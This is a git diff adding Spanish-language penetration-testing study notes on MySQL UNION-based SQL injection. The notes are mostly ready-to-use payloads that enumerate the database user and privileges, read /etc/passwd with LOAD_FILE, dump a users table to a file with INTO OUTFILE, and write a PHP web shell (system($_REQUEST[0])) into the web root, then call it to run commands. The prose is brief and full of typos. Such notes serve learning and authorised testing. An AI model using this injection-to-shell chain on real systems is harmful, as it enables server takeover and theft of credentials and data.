@@ -811,5 +811,145 @@ cn' UNION select 1, username, password, 4 from dev.credentials--
 ```
 ![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/0d7fdb38-9813-4a53-a9e9-4eea3a753e78)
 
+# LEER ARCHIVOS
+
+Una forma adicional de conseguir datos de las bases de datos, es rellendo archivos del servidor y ganar codigo ejecutable.
+
+## PRIVILEGIOS
+
+Leer dato es muy comun, porque normalmente usuarios privilegiados explicar o hay información.
+
+### DB user
+
+Primero de todo identificar la base de datos. Mientras no sea necesario ser administrador (DBA) para leer archivos, nosotros requeriremos de bases de datos modernas. Si nosotros tenemos DBA privilegios podemos ahcer lo que queramos.
+
+```
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+```
+```
+cn' UNION SELECT 1, user(), 3, 4-- -
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+```
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/89098674-c101-47ed-a2cf-3089cb26499d)
+
+### PRIVILEGIOS DE USUARIO
+
+Ahora que sabemos el usuario en el que nos encontramos, podemos ver a empezar a ver que privilegios tiene cada usuario. Primero de todo, necesitaremos testear si tenemos privilegios de super usuario.
+
+```
+SELECT super_priv FROM mysql.user
+```
+
+Una vez, nosotros podemos meter el payload.
+```
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+```
+Si hay muchos usuarios podemos añadir "WHERE user="root" para ver ese solo.
+
+```
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+```
+
+Si la consulta nos devuelve "Y" significa yes indicandonos que es asi
+
+```
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+```
+
+Podemos añadir 
+
+```
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/9c8727e6-3991-4408-b3f6-6649d1cb2d37)
+
+### EJECUTAR UN FICHERO
+
+Ahoar que sabemos los privilegios que tenemos, podemos usar "LOAD_FILE()" usando MariaDB / MySQL para leer información de los ficheros. La funcion toma argumentos por ejemplo /etc/passwd
+
+```
+SELECT LOAD_FILE('/etc/passwd');
+```
+
+Es similiar pero con la injección "UNION"
+
+```
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+```
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/5a3ad33b-2d59-4b54-8c92-2743ac7c6af9)
+
+
+# ESCRIBIR ARCHIVOS
+
+Cuando escribimos archivos del servidor back-end, nos restricciona el modelo DBMS, cuando utilziamos una web shell, o cuando hacemos ejecución de codigo.
+
+## ESCRIBIR ARCHIVOS PRIVILEGIOADO
+
+Para poder escribir ficheros en el back-end requerimos tres cosas:
+
+1. El usuario con privilegios del fichero
+2. MySQL variable "secure_file_prive" no este activa
+3. Acceso de escritura de la localizacion en al que queremos escribir.
+
+### SECURE_file_prive
+
+Se usa para determinar cuando lees/escriber. Los valores del sistema, nosotros podemos eler archivos o ficheros, no podemos leer directorios. 
+
+```
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+Sin embargo, si queremos usar "UNION" injección tenemos que tenr el valor usando "SELECT" esto no sera un problema porque sabemos que todo esta guardado en "INFORMATION_SCHEMA" 
+
+```
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+
+### SELECCIONAR DENTRO DE UN ARCHIVO
+
+Ahora que confirmamos y usamos SELECNT into a file, nosotros lo añadiremos apra leer un archivo específico.
+
+```
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+```
+
+Y si no vamos a ese archivo lo podremos leer
+```
+cat /tmp/credentials
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+cat /tmp/test.txt 
+```
+
+### ESCRIBIR ARCHIVOS CON SQL INJECTION
+
+Ahora que sabemos escribir podemos ahcer cositas
+
+```
+select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+```
+
+Para escribir una web shell, encesitaremos busacr el archivo donde sta "Load_file" para leer el archivo normlamente esta en "/etc/apache2/apache.conf" 
+
+```
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+```
+
+## ESCRIBIR UNA WEB SHELl
+
+Sabiendo esto es simple
+```
+<?php system($_REQUEST[0]); ?>
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+http://SERVER_IP:PORT/shell.php?0=id
+```
+
+
+
+
+
 
 
